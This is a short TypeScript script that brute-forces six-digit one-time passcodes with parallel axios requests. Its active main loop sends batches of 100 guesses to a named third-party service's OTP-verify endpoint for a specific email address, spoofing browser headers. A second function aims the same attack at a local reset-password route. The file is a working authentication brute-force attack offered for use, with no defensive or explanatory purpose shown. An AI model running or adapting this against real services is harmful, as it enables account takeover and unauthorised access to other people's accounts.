import axios from "axios";

async function sendRequestToMybe(otp:string) {
    
    let data = JSON.stringify({
      "email": "s@gmail.com",
      "otp": otp,
      "newPassword": "asdf"
    });

    let config = {
      method: 'post',
      maxBodyLength: Infinity,
      url: 'http://localhost:3000/reset-password',
      headers: { 
        'Content-Type': 'application/json'
      },
      data : data
    };
    try{
      await axios.request(config)
    }catch(e){

    }
  }

async function sendRequestToHarkirat(otp:string) {
  let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=sahilkhude11%40gmail.com&otp='+ otp + '&device_id=WebBrowser1734502617511ihfhki0k7tn&mydeviceid=&mydeviceid2=',
    headers: { 
      'accept': '*/*', 
      'accept-language': 'en-US,en;q=0.9,en-IN;q=0.8', 
      'auth-key': 'appxapi', 
      'client-service': 'Appx', 
      'device-type': '', 
      'origin': 'https://harkirat.classx.co.in', 
      'priority': 'u=1, i', 
      'referer': 'https://harkirat.classx.co.in/', 
      'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 
      'sec-ch-ua-mobile': '?0', 
      'sec-ch-ua-platform': '"Windows"', 
      'sec-fetch-dest': 'empty', 
      'sec-fetch-mode': 'cors', 
      'sec-fetch-site': 'same-site', 
      'source': 'website', 
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0'
    }
  };
  
  try{
    await axios.request(config)
  }catch(e){

  }
}



async function main() {
  for (let i = 100000; i <= 999999; i+=100) {
    const p = [];
    console.log(i);
    for (let j = 0; j <100; j++) {
      p.push(sendRequestToHarkirat((i+j).toString())); 
    }
    await Promise.all(p);
  }
}

main();



